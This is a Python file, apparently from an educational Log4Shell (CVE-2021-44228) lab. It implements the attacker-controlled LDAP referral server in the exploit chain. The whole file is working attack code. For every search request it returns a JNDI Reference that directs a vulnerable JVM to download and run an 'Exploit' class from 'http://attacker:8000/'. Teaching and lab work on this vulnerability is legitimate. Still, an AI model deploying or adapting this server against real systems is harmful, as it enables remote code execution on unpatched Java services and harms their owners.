#!/usr/bin/env python3
"""
SC3010 Log4Shell lab -- minimal, dependency-free LDAP referral server.

Purpose (educational): stand in for the attacker-controlled LDAP server in the
CVE-2021-44228 chain. When the victim JVM performs the JNDI lookup
`ldap://attacker:1389/Exploit`, this server answers the bind, then on the
search request returns a single entry that encodes a JNDI *Reference*:

    objectClass:   javaNamingReference
    javaClassName: Exploit
    javaCodeBase:  http://attacker:8000/
    javaFactory:   Exploit

A vulnerable JNDI/LDAP client interprets that Reference, fetches
`http://attacker:8000/Exploit.class` (served by http_server.py), loads it with
a URLClassLoader and instantiates it -- running Exploit's static initializer.

This speaks just enough LDAP (a tiny slice of RFC 4511, BER-encoded) to drive
the demo. It is a teaching stand-in, not a conformant LDAP server.

Standard library only. No third-party packages.
"""

import socket
import socketserver
import struct
import sys

HTTP_CODEBASE = "http://attacker:8000/"
CLASS_NAME = "Exploit"
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 1389


# ---------------------------------------------------------------------------
# Minimal BER/DER encoding helpers (ASN.1, as LDAP uses it).
# ---------------------------------------------------------------------------
def _ber_len(length):
    """Encode a BER length field."""
    if length < 0x80:
        return bytes([length])
    out = b""
    while length > 0:
        out = bytes([length & 0xFF]) + out
        length >>= 8
    return bytes([0x80 | len(out)]) + out


def _tlv(tag, body):
    """Tag-Length-Value wrapper."""
    return bytes([tag]) + _ber_len(len(body)) + body


def enc_int(value):
    """ASN.1 INTEGER (0x02)."""
    if value == 0:
        return _tlv(0x02, b"\x00")
    body = b""
    v = value
    while v > 0:
        body = bytes([v & 0xFF]) + body
        v >>= 8
    if body[0] & 0x80:            # keep it positive
        body = b"\x00" + body
    return _tlv(0x02, body)


def enc_octstr(s):
    """ASN.1 OCTET STRING (0x04)."""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return _tlv(0x04, s)


def enc_enum(value):
    """ASN.1 ENUMERATED (0x0A) -- used for LDAP resultCode."""
    return _tlv(0x0A, bytes([value]))


def enc_seq(*parts):
    """ASN.1 SEQUENCE (0x30)."""
    return _tlv(0x30, b"".join(parts))


def enc_set(*parts):
    """ASN.1 SET (0x31)."""
    return _tlv(0x31, b"".join(parts))


def enc_attr(name, values):
    """PartialAttribute: SEQUENCE { type OCTET STRING, vals SET OF OCTET STRING }."""
    vals = enc_set(*[enc_octstr(v) for v in values])
    return enc_seq(enc_octstr(name), vals)


# ---------------------------------------------------------------------------
# LDAP response builders.
# ---------------------------------------------------------------------------
def ldap_message(message_id, protocol_op):
    """LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE }."""
    return enc_seq(enc_int(message_id), protocol_op)


def bind_response(message_id):
    """BindResponse [APPLICATION 1] with resultCode success(0)."""
    # LDAPResult = resultCode(ENUMERATED) matchedDN(OCTET STRING) diagMsg(OCTET STRING)
    body = enc_enum(0) + enc_octstr("") + enc_octstr("")
    op = _tlv(0x61, body)        # [APPLICATION 1], constructed
    return ldap_message(message_id, op)


def search_result_entry(message_id, dn):
    """SearchResultEntry [APPLICATION 4] encoding the JNDI Reference."""
    attributes = enc_seq(
        enc_attr("objectClass", ["top", "javaNamingReference"]),
        enc_attr("javaClassName", [CLASS_NAME]),
        enc_attr("javaCodeBase", [HTTP_CODEBASE]),
        enc_attr("objectClass", ["javaNamingReference"]),
        enc_attr("javaFactory", [CLASS_NAME]),
    )
    body = enc_octstr(dn) + attributes
    op = _tlv(0x64, body)        # [APPLICATION 4], constructed
    return ldap_message(message_id, op)


def search_result_done(message_id):
    """SearchResultDone [APPLICATION 5] with resultCode success(0)."""
    body = enc_enum(0) + enc_octstr("") + enc_octstr("")
    op = _tlv(0x65, body)        # [APPLICATION 5], constructed
    return ldap_message(message_id, op)


# ---------------------------------------------------------------------------
# Tiny BER reader -- just enough to pull messageID and the protocolOp tag.
# ---------------------------------------------------------------------------
def read_len(buf, i):
    first = buf[i]
    i += 1
    if first < 0x80:
        return first, i
    num = first & 0x7F
    length = 0
    for _ in range(num):
        length = (length << 8) | buf[i]
        i += 1
    return length, i


def parse_request(data):
    """Return (message_id, protocol_op_tag) or (None, None) if incomplete."""
    try:
        i = 0
        if data[i] != 0x30:              # outer SEQUENCE
            return None, None
        _, i = read_len(data, i + 1)
        if data[i] != 0x02:              # messageID INTEGER
            return None, None
        ilen, i = read_len(data, i + 1)
        message_id = int.from_bytes(data[i:i + ilen], "big")
        i += ilen
        op_tag = data[i]                 # protocolOp tag
        return message_id, op_tag
    except (IndexError, ValueError):
        return None, None


# ---------------------------------------------------------------------------
# Connection handler.
# ---------------------------------------------------------------------------
class LDAPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        peer = self.client_address[0]
        print(f"[LDAP] connection from {peer}", flush=True)
        buf = b""
        while True:
            try:
                chunk = self.request.recv(4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk

            # Process as many complete LDAP messages as we have buffered.
            while buf:
                if buf[0] != 0x30:
                    buf = b""
                    break
                try:
                    total_len, hdr = read_len(buf, 1)
                except IndexError:
                    break                # need more bytes
                msg_end = hdr + total_len
                if len(buf) < msg_end:
                    break                # message not fully arrived yet
                message = buf[:msg_end]
                buf = buf[msg_end:]

                message_id, op_tag = parse_request(message)
                if message_id is None:
                    continue

                if op_tag == 0x60:       # bindRequest
                    print(f"[LDAP] bindRequest (id={message_id}) -> success", flush=True)
                    self.request.sendall(bind_response(message_id))
                elif op_tag == 0x63:     # searchRequest
                    print(f"[LDAP] searchRequest (id={message_id}) -> "
                          f"returning JNDI Reference to {HTTP_CODEBASE}{CLASS_NAME}.class",
                          flush=True)
                    dn = f"cn={CLASS_NAME}"
                    self.request.sendall(search_result_entry(message_id, dn))
                    self.request.sendall(search_result_done(message_id))
                elif op_tag == 0x42:     # unbindRequest
                    print(f"[LDAP] unbindRequest (id={message_id})", flush=True)
                    return
                else:
                    print(f"[LDAP] unhandled protocolOp tag=0x{op_tag:02x} "
                          f"(id={message_id})", flush=True)


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    print(f"[LDAP] SC3010 lab LDAP referral server on {LISTEN_HOST}:{LISTEN_PORT}", flush=True)
    print(f"[LDAP] will refer victims to {HTTP_CODEBASE}{CLASS_NAME}.class", flush=True)
    with ThreadedTCPServer((LISTEN_HOST, LISTEN_PORT), LDAPHandler) as server:
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("[LDAP] shutting down", flush=True)


if __name__ == "__main__":
    main()
